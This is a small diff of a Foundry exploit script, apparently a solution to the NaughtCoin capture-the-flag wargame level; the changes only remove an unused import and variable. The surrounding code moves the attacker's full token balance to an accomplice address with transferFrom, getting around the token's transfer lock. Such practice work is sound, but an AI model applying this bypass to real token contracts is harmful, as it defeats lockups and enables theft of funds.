@@ -2,7 +2,7 @@
 
 pragma solidity ^0.6.2;
 
-import {Script, console} from "forge-std/Script.sol";
+import {Script} from "forge-std/Script.sol";
 
 import {Constants} from "./Constants.s.sol";
 
@@ -19,7 +19,7 @@ contract NaughtCoinAttacker is Constants, Script {
         INaughtCoin victim = INaughtCoin(NAUGHT_COIN_ADDRESS);
 
         uint256 amount = victim.balanceOf(ATTACKER_ADDRESS);
-        uint256 allowance = victim.allowance(ATTACKER_ADDRESS, ACCOMPLICE_ADDRESS);
+        victim.allowance(ATTACKER_ADDRESS, ACCOMPLICE_ADDRESS);
 
         vm.startBroadcast(ACCOMPLICE_ADDRESS);
         victim.transferFrom(ATTACKER_ADDRESS, ACCOMPLICE_ADDRESS, amount);
